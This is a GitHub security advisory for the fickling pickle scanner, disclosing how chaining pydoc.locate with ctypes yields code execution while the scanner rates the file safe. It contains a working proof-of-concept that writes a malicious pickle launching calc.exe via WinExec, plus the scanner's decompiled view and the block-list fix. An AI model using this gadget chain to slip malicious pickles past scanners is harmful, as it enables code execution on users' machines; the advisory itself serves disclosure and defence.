# [H] Fickling vulnerable to use of ctypes and pydoc gadget chain to bypass detection

## Summary
Severity: High
Advisory: GHSA-5hvc-6wx8-mvv4
CVE: CVE-2026-22608
CWE: CWE-184, CWE-502
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-5hvc-6wx8-mvv4
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.7

## Details
# Fickling's assessment

`pydoc` and `ctypes` were added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1).

# Original report

### Summary
Both ctypes and pydoc modules arent explictly blocked. Even other existing pickle scanning tools (like picklescan) do not block pydoc.locate. Chaining these two together can achieve RCE while the scanner still reports the file as LIKELY_SAFE

### Details
Import: GLOBAL pydoc locate (Allowed).
Resolution: Call locate('ctypes.windll.kernel32.WinExec').
Execution: Call the result with (b'calc.exe', 1).

To bypass the unused variable check an exception object is used, on the assumption that Exception would not be blocked in the future as it is a benign builtin

### PoC
```python
import os

GLOBAL      = b'c'
STRING      = b'S'
BININT      = b'K'
TUPLE1      = b'\x85'
TUPLE2      = b'\x86'
EMPTY_TUPLE = b')'
REDUCE      = b'R'
PUT         = b'p'
GET         = b'g'
POP         = b'0'
EMPTY_DICT  = b'}'
SETITEM     = b's'
BUILD       = b'b'
STOP        = b'.'

def generate_stealth_payload():
    payload = b""

    payload += GLOBAL + b"pydoc\nlocate\n"
    payload += STRING + b"'ctypes.windll.kernel32.WinExec'\n"
    payload += TUPLE1 + REDUCE
    payload += PUT + b"0\n" # Var 0 = <_FuncPtr WinExec>
    payload += POP

    payload += GET + b"0\n" 
    payload += b"C" + b"\x08" + b"calc.exe" 
    payload += BININT + b"\x01"             
    payload += TUPLE2 + REDUCE
    payload += PUT + b"1\n" # Var 1 = Execution Result
    payload += POP

    payload += GLOBAL + b"builtins\nException\n"
    payload += EMPTY_TUPLE + REDUCE
    payload += PUT + b"2\n" # Var 2 = Exception instance

    payload += EMPTY_DICT
    payload += STRING + b"'rce_status'\n"
    payload += GET + b"1\n"
    payload += SETITEM      # { 'rce_status': result }
    
    payload += BUILD 
    
    payload += STOP
    return payload

data = generate_stealth_payload()
with open("stealth_ctypes.pkl", "wb") as f:
    f.write(data)
    
print("Generated 'stealth_ctypes.pkl'")
````

What fickling sees
```python
from pydoc import locate
_var0 = locate('ctypes.windll.kernel32.WinExec')
_var1 = _var0(b'calc.exe', 1)
_var2 = Exception()
_var3 = _var2
_var3.__setstate__({'rce_status': _var1})
result0 = _var3
```
<img width="915" height="197" alt="image" src="https://github.com/user-attachments/assets/b5d81e0d-4946-4768-a704-618a4554ae7a" />

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-5hvc-6wx8-mvv4
- https://nvd.nist.gov/vuln/detail/CVE-2026-22608
- https://github.com/trailofbits/fickling/pull/195
- https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1
- https://github.com/trailofbits/fickling/commit/d0b00d584afb5c58e38991cd544cb3889de90db6
- https://github.com/trailofbits/fickling
- https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L145
- https://github.com/trailofbits/fickling/releases/tag/v0.1.7
